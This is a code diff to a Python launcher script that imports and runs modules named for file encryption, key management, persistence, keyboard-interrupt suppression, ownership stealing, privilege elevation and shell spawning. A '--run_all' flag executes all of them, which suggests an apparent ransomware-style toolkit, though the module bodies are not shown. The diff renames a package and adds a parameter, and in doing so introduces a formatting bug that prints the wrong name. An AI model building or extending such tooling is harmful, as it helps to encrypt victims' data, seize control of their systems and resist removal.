@@ -6,20 +6,22 @@ from importlib import import_module
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parent
+if str(ROOT) not in sys.path:
+    sys.path.insert(0, str(ROOT))
 if str(ROOT.parent) not in sys.path:
     sys.path.insert(0, str(ROOT.parent))
 
 
-def run_module(module_name, attr=None):
+def run_module(module_name, function_name : str ,attr=None):
     try:
         mod = import_module(module_name)
-        target = getattr(mod, attr) if attr else getattr(mod, "main", None)
+        target = getattr(mod, attr) if attr else getattr(mod, function_name, None)
         if callable(target):
             target()
         else:
-            print(f"{module_name} loaded")
+            print(f"{module_name and function_name} loaded")
     except Exception as exc:
-        print(f"{module_name} unavailable: {exc}")
+        print(f"{module_name and function_name} unavailable: {exc}")
 
 
 def main():
@@ -33,16 +35,16 @@ def main():
     args = parser.parse_args()
 
     if args.os_info:
-        from platform.platform_utils import get_os_type
+        from platform_mod.platform_utils import get_os_type
         print(get_os_type())
     if args.start_terminal:
         from core.manager import TerminalManager
         TerminalManager().start_terminal()
     if args.start_cmd:
-        from platform.mycmd import starter_cmd
+        from platform_mod.mycmd import starter_cmd
         starter_cmd()
     if args.start_powershell:
-        from platform.powershell import start_powershell
+        from platform_mod.powershell import start_powershell
         start_powershell()
 
     if args.run_all:
@@ -51,8 +53,8 @@ def main():
             "core.background_runner", "core.base", "core.manager",
             "crypto.encryption_key_manager", "crypto.encryptor1",
             "persistence.keyboard_interrupt_suppress", "persistence.os_root_save", "persistence.ownership_steal",
-            "platform.android_shell_util", "platform.elevate", "platform.mycmd",
-            "platform.platform_utils", "platform.powershell", "platform.shells",
+            "platform_mod.android_shell_util", "platform_mod.elevate", "platform_mod.mycmd",
+            "platform_mod.platform_utils", "platform_mod.powershell", "platform_mod.shells",
         ]
         for name in modules:
             run_module(name, "main")
